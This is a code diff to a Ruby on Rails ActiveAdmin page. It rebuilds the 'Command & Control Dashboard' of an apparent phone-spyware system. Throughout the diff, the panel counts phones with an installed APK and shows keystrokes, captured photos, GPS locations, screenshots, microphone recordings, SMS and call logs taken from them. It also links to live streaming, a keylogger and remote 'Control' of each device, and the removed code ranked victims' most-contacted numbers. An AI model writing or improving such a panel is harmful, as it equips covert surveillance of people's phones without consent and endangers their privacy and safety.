@@ -1,289 +1,353 @@
 ActiveAdmin.register_page "Dashboard" do
-  menu priority: 1, label: "Dashboard"
+  menu priority: 1, label: "📊 Dashboard"
 
   action_item :tracing do
     link_to "🔍 Tracing (Jaeger)", "http://localhost:16686", target: "_blank", class: "button"
   end
 
-  content title: proc { I18n.t("active_admin.dashboard") } do
-    class Activity
-      attr_reader :type
-      attr_reader :date
+  action_item :live_streaming do
+    link_to "📹 Live Streaming", admin_live_streaming_path, class: "button primary"
+  end
 
-      def initialize(type, date)
-        @type = type
-        @date = date
-      end
-    end
+  action_item :keylogger do
+    link_to "⌨️ Keylogger", admin_keylogger_dashboard_path, class: "button"
+  end
 
-    objects = Picture.all +
-              CallLog.all +
-              Contact.all +
-              GeoLocation.all +
-              Recording.all +
-              Screenshot.all +
-              SmsMessage.all
-    activities = []
-    objects.each do |object|
-      activities << Activity.new(object.class.to_s,
-                                 object.date.to_s)
-    end
-    mockActivities = [
-      Activity.new("SMS Dump",
-                   Date.new(2021, 2, 4)),
-      Activity.new("Calls",
-                   Date.new(2021, 2, 5)),
-      Activity.new("Web Snap",
-                   Date.new(2021, 2, 6)),
-
-    ]
-    activities = activities.empty? ?
-      mockActivities :
-      activities.sort_by(&:date)
-      .reverse!
-      .take(10)
-
-    def generateClipPath(callsCount, smsCount, whatsappCount)
-      totalCount = callsCount +
-                   smsCount +
-                   whatsappCount
-      callsPercentage = callsCount * 100 / totalCount
-      smsPercentage = smsCount * 100 / totalCount
-      whatsappPercentage = whatsappCount * 100 / totalCount
-
-      innerPolygon = "polygon(50% #{69 - callsPercentage * 0.65}%, #{23 - smsPercentage * 0.23}% #{82 + smsPercentage * 0.15}%, #{77 + whatsappPercentage * 0.2}% #{82 + whatsappPercentage * 0.15}%)"
-      outerPolygon = "polygon(50% #{66 - callsPercentage * 0.62}%, #{20 - smsPercentage * 0.2}% #{85 + smsPercentage * 0.15}%, #{80 + whatsappPercentage * 0.2}% #{85 + whatsappPercentage * 0.15}%)"
-      return [innerPolygon, outerPolygon]
-    end
-
-    contactsOfInterest = {}
-    calls = []
-    smsMessages = []
-    whatsappMessages = []
-
-    callsFile = Dir["files/dumps/calllogs_dumps/*.txt"]
-      .sort { |a, b| File.mtime(a) <=> File.mtime(b) }.last
-    smsFile = Dir["files/dumps/sms_messages_dumps/*.txt"]
-      .sort { |a, b| File.mtime(a) <=> File.mtime(b) }.last
-    whatsAppFile = Dir["files/dumps/whatsapp/*.txt"]
-      .sort { |a, b| File.mtime(a) <=> File.mtime(b) }.last
-
-    if callsFile.present?
-      callsLines = File
-        .readlines(callsFile)
-        .filter { |line| line =~ /^Number\s:/ }
-      calls = callsLines
-        .map { |line| line.split(":")[1].strip }
-      callNumbers = Hash.new(0)
-      calls.each { |number| callNumbers[number] += 1 }
-      callsMaxCount = callNumbers
-        .filter { |k, v| !(contactsOfInterest.key? k) }
-        .values
-        .sort
-        .reverse[0]
-    end
-    if smsFile.present?
-      smsMessagesLines = File
-        .readlines(smsFile)
-        .filter { |line| line =~ /^Address\t:/ }
-      smsMessages = smsMessagesLines
-        .map { |line| line.split(":")[1].strip }
-      smsNumbers = Hash.new(0)
-      smsMessages.each { |number| smsNumbers[number] += 1 }
-      smsMaxCount = smsNumbers
-        .filter { |k, v| !(contactsOfInterest.key? k) }
-        .values
-        .sort
-        .reverse[0]
-    end
-    if whatsAppFile.present?
-      whatsappMessagesLines = File
-        .readlines(whatsAppFile)
-        .filter { |line| !(line =~ /------/) && line =~ /@s.whatsapp.net---/ }
-      whatsappMessages = whatsappMessagesLines
-        .map { |line|
-        line.split("---")[1]
-          .strip
-          .slice(1, 10)
+  content title: "🎯 Command & Control Dashboard" do
+    # Connected devices stats
+    connected_devices = Smartphone.joins(:apk_installation)
+                                  .where("apk_installations.status = ?", "installed")
+                                  .count
+    total_devices = Smartphone.count
+    
+    # Data collection stats (last 24h)
+    last_24h = 24.hours.ago
+    new_keylogs = 0 # TODO: Implement keylog count from JSON logs
+    new_photos = Picture.where("created_at > ?", last_24h).count
+    new_locations = GeoLocation.where("created_at > ?", last_24h).count
+    new_sms = SmsMessage.where("created_at > ?", last_24h).count
+    new_calls = CallLog.where("created_at > ?", last_24h).count
+    
+    # Activity feed
+    recent_activity = []
+    
+    # Collect recent data
+    Picture.order(created_at: :desc).limit(5).each do |pic|
+      recent_activity << { 
+        type: "📷 Photo Captured", 
+        time: pic.created_at, 
+        device: pic.smartphone&.name || "Unknown"
       }
-      whatsappNumbers = Hash.new(0)
-      whatsappMessages.each { |number| whatsappNumbers[number] += 1 }
-      whatsappMaxCount = whatsappNumbers
-        .filter { |k, v| !(contactsOfInterest.key? k) }
-        .values
-        .sort
-        .reverse[0]
     end
-    @contacts = []
-    if (!callsFile.present? || calls.empty?) ||
-       (!smsFile.present? || smsMessages.empty?) ||
-       (!whatsAppFile.present? || whatsappMessages.empty?)
-      mockContacts = [{ "contact" => "Contact 1",
-                       "polygons" => ["polygon(50% 4.0%, 23.0% 82.0%, 77.0% 82.0%)",
-                                      "polygon(50% 4.0%, 20.0% 85.0%, 80.0% 85.0%)"] },
-                      { "contact" => "Contact 2",
-                       "polygons" => ["polygon(50% 69.0%, 0.0% 97.0%, 77.0% 82.0%)",
-                                      "polygon(50% 66.0%, 0.0% 100.0%, 80.0% 85.0%)"] },
-                      { "contact" => "Contact 3",
-                       "polygons" => ["polygon(50% 69.0%, 23.0% 82.0%, 97.0% 97.0%)",
-                                      "polygon(50% 66.0%, 20.0% 85.0%, 100.0% 100.0%)"] }]
-    else
-      contactsOfInterest.merge! [callNumbers
-                                  .detect { |k, v| callNumbers[k] == callsMaxCount }]
-                                  .to_h.map { |k, v|
-                                  [k, :whatsapp_count => whatsappNumbers.key?(k) ? whatsappNumbers[k] : 0,
-                                      :calls_count => v,
-                                      :sms_count => smsNumbers.key?(k) ? smsNumbers[k] : 0]
-                                }
-                                  .to_h
-
-      contactsOfInterest.merge! [smsNumbers
-                                  .detect { |k, v| smsNumbers[k] == smsMaxCount }]
-                                  .to_h.map { |k, v|
-                                  [k, :whatsapp_count => callNumbers.key?(k) ? callNumbers[k] : 0,
-                                      :calls_count => callNumbers.key?(k) ? callNumbers[k] : 0,
-                                      :sms_count => v]
-                                }
-                                  .to_h
-
-      contactsOfInterest.merge! [whatsappNumbers
-                                  .detect { |k, v| whatsappNumbers[k] == whatsappMaxCount }]
-                                  .to_h.map { |k, v|
-                                  [k, :whatsapp_count => v,
-                                      :calls_count => callNumbers.key?(k) ? callNumbers[k] : 0,
-                                      :sms_count => smsNumbers.key?(k) ? smsNumbers[k] : 0]
-                                }
-                                  .to_h
-      contactsOfInterest
-        .each { |k, v| @contacts.append({ "contact" => k, "polygons" => generateClipPath(v[:calls_count], v[:sms_count], v[:whatsapp_count]) }) }
+    
+    GeoLocation.order(created_at: :desc).limit(5).each do |loc|
+      recent_activity << { 
+        type: "📍 Location Update", 
+        time: loc.created_at, 
+        device: loc.smartphone&.name || "Unknown",
+        details: "#{loc.latitude}, #{loc.longitude}"
+      }
     end
+    
+    Screenshot.order(created_at: :desc).limit(5).each do |ss|
+      recent_activity << { 
+        type: "🖥️ Screenshot", 
+        time: ss.created_at, 
+        device: ss.smartphone&.name || "Unknown"
+      }
+    end
+    
+    Recording.order(created_at: :desc).limit(5).each do |rec|
+      recent_activity << { 
+        type: "🎤 Audio Recording", 
+        time: rec.created_at, 
+        device: rec.smartphone&.name || "Unknown"
+      }
+    end
+    
+    # Sort by time descending, take top 10
+    recent_activity = recent_activity.sort_by { |a| a[:time] }.reverse.take(10)
 
-    mockGeoLocations = [GeoLocation.new(:date => DateTime.now,
-                                        :lat => "44.4370361",
-                                        :long => "26.1001263",
-                                        :smartphone_id => 1),
-                        GeoLocation.new(:date => DateTime.now,
-                                        :lat => "44.446645",
-                                        :long => "26.0971272",
-                                        :smartphone_id => 1),
-                        GeoLocation.new(:date => DateTime.now,
-                                        :lat => "44.4223774",
-                                        :long => "26.1032976",
-                                        :smartphone_id => 1),
-                        GeoLocation.new(:date => DateTime.now,
-                                        :lat => "44.4805145",
-                                        :long => "26.0599887",
-                                        :smartphone_id => 1),
-                        GeoLocation.new(:date => DateTime.now,
-                                        :lat => "44.4330974",
-                                        :long => "26.0984865",
-                                        :smartphone_id => 1)]
-
+    # === Modern Dashboard Layout ===
+    
+    # Row 1: Key Metrics Cards
     columns do
-      column span: 3 do
-        columns do
-          column do
-            render partial: "calls_count",
-                   locals: { name: "CALL DUMPS",
-                             count: CallLog.all.size }
+      column do
+        panel "🖥️ Connected Devices", class: "metric-card" do
+          div class: "metric-value" do
+            span connected_devices, class: "big-number connected"
+            span " / #{total_devices}", class: "total"
           end
-
-          column do
-            render partial: "messages_count",
-                   locals: { name: "SMS DUMPS ",
-                             count: SmsMessage.all.size }
-          end
-
-          column do
-            render partial: "screenshots_count",
-                   locals: { name: "SCREEN SNAPS",
-                             count: Screenshot.all.size }
-          end
-
-          column do
-            render partial: "contacts_count",
-                   locals: { name: "CONTACTS DUMPS",
-                             count: Contact.all.size }
+          div class: "metric-label" do
+            "Active Devices Online"
           end
         end
       end
-
+      
       column do
-        panel "Activities" do
-          tabs do
-            tab :Timeline do
-              render partial: "timeline",
-                     locals: { activities: activities }
-              render partial: "triangle_info",
-                     locals: { color: "green",
-                               tooltip_message: "See the latest tasks completed on the platform." }
-            end
-            tab :Charts do
-            end
+        panel "⌨️ Keylogs (24h)", class: "metric-card" do
+          div class: "metric-value" do
+            span new_keylogs, class: "big-number"
+          end
+          div class: "metric-label" do
+            "Keystrokes Captured"
+          end
+        end
+      end
+      
+      column do
+        panel "📷 Photos (24h)", class: "metric-card" do
+          div class: "metric-value" do
+            span new_photos, class: "big-number"
+          end
+          div class: "metric-label" do
+            "Photos Captured"
+          end
+        end
+      end
+      
+      column do
+        panel "📍 Locations (24h)", class: "metric-card" do
+          div class: "metric-value" do
+            span new_locations, class: "big-number"
+          end
+          div class: "metric-label" do
+            "GPS Updates"
           end
         end
       end
     end
-
+    
+    # Row 2: Communication Stats
     columns do
-      column span: 3 do
-        columns do
-          column do
-            render partial: "recordings_count",
-                   locals: { name: "MICROPHONE RECS",
-                             count: Recording.all.size }
-          end
-
-          column do
-            render partial: "pictures_count",
-                   locals: { name: "CAMERA SNAPS",
-                             count: Picture.all.size }
-          end
-
-          column do
-            render partial: "videos_count",
-                   locals: { name: "WHATSAPP DUMPS",
-                             count: MessagingAppsDump.all.size }
-          end
-
-          column do
-            render partial: "locations_count",
-                   locals: { name: "LOCATION DUMPS",
-                             count: GeoLocation.all.size }
+      column do
+        panel "📱 SMS (24h)", class: "metric-card secondary" do
+          div class: "metric-value" do
+            span new_sms, class: "big-number"
           end
         end
       end
+      
       column do
+        panel "📞 Calls (24h)", class: "metric-card secondary" do
+          div class: "metric-value" do
+            span new_calls, class: "big-number"
+          end
+        end
+      end
+      
+      column do
+        panel "🖼️ Screenshots", class: "metric-card secondary" do
+          div class: "metric-value" do
+            span Screenshot.count, class: "big-number"
+          end
+        end
+      end
+      
+      column do
+        panel "🎤 Recordings", class: "metric-card secondary" do
+          div class: "metric-value" do
+            span Recording.count, class: "big-number"
+          end
+        end
       end
     end
-
+    
+    # Row 3: Activity Feed & Device List
     columns do
       column span: 2 do
-        panel "Locations" do
-          render partial: "map",
-                 locals: { locations: GeoLocation.all.present? ?
-                   GeoLocation
-                   .all
-                   .sort_by(&:date)
-                   .reverse!
-                   .take(5) :
-                   mockGeoLocations }
+        panel "📋 Recent Activity", class: "activity-feed" do
+          if recent_activity.empty?
+            para "No recent activity. Waiting for data...", class: "placeholder-text"
+          else
+            table_for recent_activity do
+              column "Type" do |activity|
+                span activity[:type], class: "activity-type"
+              end
+              column "Device" do |activity|
+                span activity[:device], class: "device-name"
+              end
+              column "Details" do |activity|
+                span activity[:details], class: "activity-details" if activity[:details]
+              end
+              column "Time" do |activity|
+                span time_ago_in_words(activity[:time]), class: "time-ago"
+              end
+            end
+          end
         end
       end
+      
       column do
-        panel "Contacts of Interest" do
-          render partial: "radar_chart",
-                 locals: { contacts: @contacts.empty? ?
-                   mockContacts :
-                   @contacts }
-          render partial: "triangle_info",
-                 locals: { color: "blue",
-                           tooltip_message: "See the most contacted phone numbers with respect to messages, calls and Whatsapp conversations." }
+        panel "📱 Connected Devices", class: "device-list" do
+          devices = Smartphone.joins(:apk_installation)
+                             .where("apk_installations.status = ?", "installed")
+                             .limit(10)
+          
+          if devices.empty?
+            para "No devices connected.", class: "placeholder-text"
+          else
+            table_for devices do
+              column "Device" do |device|
+                div class: "device-info" do
+                  strong device.name || "Unknown"
+                  br
+                  span device.operating_system, class: "os-badge"
+                end
+              end
+              column "Status" do |device|
+                status_badge "🟢 Online", class: "status-online"
+              end
+              column "Actions" do |device|
+                link_to "Control", admin_remote_path(device_id: device.id), class: "button mini"
+              end
+            end
+          end
         end
       end
-
-      column do
+    end
+    
+    # Row 4: Quick Actions
+    panel "⚡ Quick Actions", class: "quick-actions" do
+      div class: "action-buttons" do
+        link_to "📹 Start Live Stream", admin_live_streaming_path, class: "button primary large"
+        link_to "⌨️ View Keylogs", admin_keylogger_dashboard_path, class: "button large"
+        link_to "📍 Track Locations", admin_geo_locations_path, class: "button large"
+        link_to "📷 View Photos", admin_pictures_path, class: "button large"
+        link_to "🎤 Recordings", admin_recordings_path, class: "button large"
+        link_to "📱 SMS Messages", admin_sms_messages_path, class: "button large"
+        link_to "📞 Call Logs", admin_call_logs_path, class: "button large"
+        link_to "📇 Contacts", admin_contacts_path, class: "button large"
       end
+    end
+    
+    # CSS Styles for modern dashboard
+    style do
+      text %{
+        .metric-card {
+          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+          border: none;
+          border-radius: 12px;
+          box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+          color: white;
+          padding: 20px;
+          transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+        
+        .metric-card:hover {
+          transform: translateY(-5px);
+          box-shadow: 0 8px 25px rgba(0,0,0,0.15);
+        }
+        
+        .metric-card.secondary {
+          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+          opacity: 0.9;
+        }
+        
+        .metric-value {
+          font-size: 48px;
+          font-weight: bold;
+          margin-bottom: 10px;
+        }
+        
+        .big-number {
+          display: inline-block;
+          animation: countUp 0.5s ease-out;
+        }
+        
+        .big-number.connected {
+          color: #4ade80;
+        }
+        
+        .metric-value .total {
+          font-size: 24px;
+          opacity: 0.7;
+        }
+        
+        .metric-label {
+          font-size: 14px;
+          text-transform: uppercase;
+          letter-spacing: 1px;
+          opacity: 0.9;
+        }
+        
+        .activity-feed table {
+          width: 100%;
+        }
+        
+        .activity-type {
+          font-weight: bold;
+        }
+        
+        .device-name {
+          color: #667eea;
+          font-weight: 500;
+        }
+        
+        .time-ago {
+          color: #64748b;
+          font-size: 0.9em;
+        }
+        
+        .device-list table {
+          width: 100%;
+        }
+        
+        .device-info {
+          line-height: 1.6;
+        }
+        
+        .os-badge {
+          background: #e0e7ff;
+          color: #4f46e5;
+          padding: 2px 8px;
+          border-radius: 4px;
+          font-size: 0.8em;
+        }
+        
+        .status-online {
+          background: #dcfce7;
+          color: #16a34a;
+          padding: 4px 12px;
+          border-radius: 6px;
+          font-weight: 500;
+        }
+        
+        .button.mini {
+          padding: 4px 12px;
+          font-size: 0.85em;
+        }
+        
+        .quick-actions .action-buttons {
+          display: flex;
+          flex-wrap: wrap;
+          gap: 12px;
+          justify-content: center;
+        }
+        
+        .button.large {
+          padding: 12px 24px;
+          font-size: 1em;
+          border-radius: 8px;
+        }
+        
+        .button.primary {
+          background: #667eea;
+          color: white;
+        }
+        
+        .placeholder-text {
+          text-align: center;
+          color: #94a3b8;
+          padding: 40px 20px;
+          font-style: italic;
+        }
+        
+        @keyframes countUp {
+          from { opacity: 0; transform: translateY(20px); }
+          to { opacity: 1; transform: translateY(0); }
+        }
+      }
     end
   end
 end
